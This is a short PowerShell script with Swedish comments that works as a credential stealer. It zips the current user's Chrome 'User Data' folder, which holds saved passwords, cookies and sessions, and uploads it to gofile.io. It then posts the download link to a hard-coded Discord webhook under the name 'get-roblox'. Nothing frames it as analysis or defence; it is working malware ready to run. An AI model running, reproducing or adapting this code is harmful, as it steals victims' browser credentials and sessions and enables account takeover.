Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome\User Data" -DestinationPath "$env:temp\temp.zip" -Force

# Lägg till filen i ett hashtable (Multipart/form-data)
$form = @{
    file = Get-Item "$env:temp\temp.zip"
}

# Skicka anropet (Invoke-RestMethod konverterar JSON-svaret automatiskt)
$response = Invoke-RestMethod -Uri "https://upload.gofile.io/uploadfile" -Method Post -Form $form

$link = $response.data.downloadPage

# Byt ut mot din faktiska webhook-URL från Discord
$WebhookUrl = "https://discord.com/api/webhooks/1562163056358989930/a-ZW7q-A3ekHBXZN2GUoAgnVy5B9ZQ2tQQqGDlINUDrGv_DevTKve5cR6qvGMg-C2g5C"

# Skapa meddelandet i ett objekt
$Payload = [PSCustomObject]@{
    content  = $link
    username = "get-roblox" # Valfritt: Ändrar namnet på webhooken temporärt
}

# Konvertera till JSON och skicka
$JsonPayload = $Payload | ConvertTo-Json -Depth 5
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonPayload -ContentType "application/json"
